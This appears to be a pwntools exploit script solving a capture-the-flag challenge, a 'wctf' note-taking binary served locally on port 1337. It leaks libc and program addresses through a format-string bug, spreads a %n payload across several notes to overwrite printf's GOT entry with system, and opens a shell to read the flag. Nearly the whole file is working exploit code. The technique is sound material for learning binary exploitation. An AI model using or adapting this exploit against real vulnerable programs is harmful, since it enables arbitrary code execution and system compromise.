#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal
from pwn import *
from time import sleep

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/chal')
libc = ELF('/challenge/libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()
io = remote('127.0.0.1',1337)

# Step 1: ASLR bypass

io.sendline(b'20') # how many notes

io.sendline(b'1') # write note
io.sendline(b'0') # write note 0
io.sendline(b'%23$p')

io.sendline(b'2') # read note
io.sendline(b'0') # read note 0

io.recvuntil(b"Your note reads:\n\n")
leak = int(io.recvline()[:-1],16)

log.success("leaked: "+hex(leak))

libc_base = leak - (libc.sym['__libc_start_main']+243)
log.success("libc base at "+hex(libc_base))

libc.address = libc_base

# # Step 2: PIE bypass
io.sendline(b'1') # write note
io.sendline(b'0') # write note 0
io.sendline(b'%27$p')

io.sendline(b'2') # read note
io.sendline(b'0') # read note 0

io.recvuntil(b"Your note reads:\n\n")
main_leak = int(io.recvline()[:-1],16)
log.info(f"leaked: " + hex(main_leak) + hex(exe.sym.main))
exe.address = main_leak - (exe.sym['main'])
log.success('exe base @ '+hex(exe.address))
log.info('main @ '+hex(exe.sym['main']))


# Step 3: abuse format string to execute system('/bin/sh')

io.sendline(b'1') # write note
io.sendline(b'0') # write note 0
io.sendline(b'/bin/sh')

sleep(0.1)

# %12$p is our input
#craft format string payload that will take multiple notes
#first 2bytes
to_write = libc.sym['system'] & 0xffff
remaining = to_write
log.info("To write " +hex(to_write))
fmt = bytes(f'%{remaining}x' , 'ascii')
payload =b''
payload += fmt
payload += b'%12$n'

log.info(f"remaining = {hex(remaining)}")

#second 2bytes
to_write = (libc.sym['system'] >> 16) & 0xffff
log.info("To write " + hex(to_write))
if(to_write <= remaining):
    remaining = to_write - remaining
    remaining = 0xffff + remaining + 1
else:
    remaining = to_write - remaining

fmt = bytes(f'%{remaining}x' , 'ascii')
current = to_write

payload += fmt
payload += b'%13$n'

log.info(f"remaining = {hex(remaining)}")

# 3rd 2bytes
to_write = (libc.sym['system'] >> 32) & 0xffff
log.info("To write " + hex(to_write))
if(to_write <= current):
    remaining = to_write - current
    remaining = 0xffff + remaining + 1
else:
    remaining = to_write - current 

fmt = bytes(f'%{remaining}x' , 'ascii')
current = to_write

payload += fmt
payload += b'%14$n'

log.info(f"remaining = {hex(remaining)}")

# 4th 2bytes
to_write = (libc.sym['system'] >> 48) & 0xffff
log.info("To write " + hex(to_write))
if(to_write <= current):
    remaining = to_write - current 
    remaining = 0xffff + remaining + 1
else:
    remaining = to_write - current 

fmt = bytes(f'%{remaining}x' , 'ascii')

payload += fmt
payload += b'%15$n'

log.info(f"remaining = {hex(remaining)}")


log.info(payload)
log.info(str(len(payload)))


#write format string payload to contiguous memory
sleep(0.1)
io.sendline(b'1') 
io.sendline(b'2') 
io.sendline(payload[:16])
sleep(0.1)
io.sendline(b'1') 
io.sendline(b'3') 
io.sendline(payload[16:32])

sleep(0.1)
io.sendline(b'1')
io.sendline(b'4')
io.sendline(payload[32:])

#write target addresses to input buffer
log.info("Printf got @ " +hex(exe.got.printf))
payload = b'' 
payload += p64(exe.got['printf']) 
payload += p64(exe.got['printf']+2) 
payload += p64(exe.got.printf + 4)
payload += p64(exe.got.printf + 6)

sleep(0.1)
io.sendline(b'1') 
io.sendline(b'6') 
io.sendline(payload)


log.info("Executing format string")
sleep(0.1)
io.sendline(b'2')
io.sendline(b'2') # execute format string

io.sendline(b'2') #printf /bin/sh (printf will call system)
io.sendline(b'0')

io.clean()
io.sendline(b'cat flag.txt')
result = str(io.recv().decode('ascii'))
if 'wctf{' in result:
    print(result)
    exit(0)
exit(1)
